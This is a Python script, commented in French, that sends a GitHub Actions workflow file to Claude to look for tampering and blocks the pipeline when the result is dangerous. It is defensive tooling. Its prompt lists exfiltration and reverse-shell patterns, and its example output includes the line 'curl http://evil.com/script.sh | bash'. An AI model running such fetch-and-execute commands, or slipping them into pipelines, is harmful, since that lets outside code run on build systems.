import anthropic
import json
import os
import sys
from pathlib import Path
from rich.console import Console

console = Console()

def lire_pipeline(chemin=".github/workflows/pipeline.yml"):
    """Lit le contenu du fichier pipeline"""
    if not Path(chemin).exists():
        console.print(f"[red]Fichier {chemin} introuvable[/red]")
        return None
    with open(chemin) as f:
        return f.read()

def analyser_pipeline_avec_ia(contenu_yaml):
    """Envoie le pipeline YAML à Claude pour détection d'anomalies"""
    client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])

    prompt = f"""Tu es un expert en sécurité CI/CD. Analyse ce fichier GitHub Actions YAML et détecte toute anomalie de sécurité.

```yaml
{contenu_yaml}
```

Recherche spécifiquement :
1. Commandes curl vers des URL inconnues ou suspectes
2. Exfiltration de secrets (echo $SECRET, env | curl...)
3. Téléchargement de scripts externes non vérifiés
4. Commandes de backdoor (nc, netcat, reverse shell)
5. Modifications de variables d'environnement suspectes
6. Actions GitHub non officielles (pas actions/* ou uses officiels)

Réponds en JSON :
{{
  "statut": "SAFE|SUSPECT|DANGEREUX",
  "anomalies": [
    {{
      "ligne_approximative": 42,
      "commande_suspecte": "curl http://evil.com/script.sh | bash",
      "raison": "Téléchargement et exécution de script non vérifié",
      "severite": "CRITIQUE|HAUTE|MOYENNE"
    }}
  ],
  "recommandation": "Que faire maintenant",
  "bloquer_pipeline": true
}}"""

    message = client.messages.create(
        model="claude-opus-4-5",
        max_tokens=1500,
        messages=[{"role": "user", "content": prompt}]
    )
    return json.loads(message.content[0].text)

if __name__ == "__main__":
    console.print("[bold blue]Agent Anti-Tampering démarré[/bold blue]")

    contenu = lire_pipeline()
    if not contenu:
        sys.exit(1)

    resultat = analyser_pipeline_avec_ia(contenu)

    statut = resultat.get("statut", "INCONNU")
    anomalies = resultat.get("anomalies", [])

    if statut == "DANGEREUX":
        console.print(f"[bold red]PIPELINE BLOQUÉ — Modification malveillante détectée ![/bold red]")
        for a in anomalies:
            console.print(f"[red]CRITIQUE: {a['commande_suspecte']} — {a['raison']}[/red]")
        sys.exit(1)  # Bloque le pipeline GitHub Actions
    elif statut == "SUSPECT":
        console.print(f"[yellow]AVERTISSEMENT — Éléments suspects détectés[/yellow]")
        for a in anomalies:
            console.print(f"[yellow]SUSPECT: {a['commande_suspecte']}[/yellow]")
    else:
        console.print(f"[green]Pipeline vérifié — Aucune anomalie détectée[/green]")